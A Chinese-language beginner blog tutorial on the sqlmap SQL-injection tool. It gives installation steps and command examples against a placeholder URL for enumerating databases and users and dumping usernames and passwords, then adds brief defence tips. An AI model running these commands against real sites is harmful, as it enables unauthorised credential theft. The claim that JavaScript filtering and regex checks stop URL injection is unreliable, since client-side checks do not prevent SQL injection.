## 一、简介
SQLMAP是一款非常强大的开源渗透测试工具，用于自动检测和利用SQL注入漏洞控制数据库服务器的过程。它配备了一个强大的检测引擎，由Python语言开发完成，通过外部连接访问数据库底层文件系统和操作系统，并执行命令实现渗透。
## 二、安装方式
首先需要计算机已经配置有python开发环境，接着进入命令控制面板，输入：pip install sqlmap（建议：在使用pip时首先进行换源，换为国内的源，可以加快下载速度）。
接着进入到sqlmap文件夹目录下就可以开始进行使用了
## 三、基本命令

1. 进行漏洞检测：使用命令为：***python sqlmap.py -u "http://XXXXXX"***
   在该条命令中，-u表示网址url。

2. 获取所有数据库：--dbs，使用命令为：***python sqlmap.py -u "http://XXXXXXX" --dbs***
   在该条命令中，--dbs表示数据库databases。

3. 获取当前数据库：--current-db，使用命令为：***python sqlmap.py -u "http://XXXXXXX" --current-db***
   在该条命令中，--current-db表示当前数据库。

4. 获取数据库所有用户：--users，使用命令为：***python sqlmap.py -u "http://XXXXXXX" --users***
   输出为该数据库的用户库

5. 获取数据库当前用户：--current-user，使用命令为：***python sqlmap.py -u "http://XXXXXXX" --current-user***
   输出为当前数据库的用户。

6. 获取数据库所有用户和密码：--passwords，使用命令为：***python sqlmap.py -u "http://XXXXXXX" --passwords***
   输出为数据库的用户名及其密码

7. 获取数据库的所有表：-D database --tables，使用命令：***python sqlmap.py -u "http://XXXXXXX" -D database --tables***
   输出为数据库database下的所有表信息

8. 获取数据库登录表的所有字段：-D database -T table --columns，使用命令：***python sqlmap.py -u "http://XXXXXXX" -D database -T table --columns***
   输出为数据库database下table表的所有列信息

9. 获取数据库登录表的用户名及密码：-D database -T table -C "column1,column2" --dump，使用命令：***python sqlmap.py -u "http://XXXXXXX" -D databse -T table -C "column1,column2" --dump***
   输出为数据库database下table表中的用户名及密码。
   另外，如果字段内容过多，可以设置输出个数，具体参数为：***--start num1 --stop num2 --dump***
   通过以上步骤我们就可以使用sqlmap完成一次注入攻击。

## 四、对于SQL注入的防御措施

对于绝大多数网站而言，存在数据库中的信息大多数都使用<u>不同的加密算法进行加密</u>，在这个基础上，即使存在hacker渗透并获取了数据库信息，那么在解密上也会存在困难，当然，这是我们数据库保护的最后一条防线。

在JS中，可以通过设置**特殊字符屏蔽，正则表达式筛选，对敏感字符进行检查**等措施防止从URL进行注入。

## 五、总结
SQL注入学习并不能完全依赖于工具，了解SQL注入的原理，理解SQL注入攻击的特点，才能更好的对这样的攻击方式做出防御手段。所以，打好基础依然很重要，工具的使用只是简化了程序员的工作量。
对于网络安全方面，我还是个小白，存在对技术理解有误或者存在错误的地方，欢迎各位大佬指出，我一定积极改正。
借鉴一句话送给自己和同行者：“苦心人，天不负，吾道不孤。”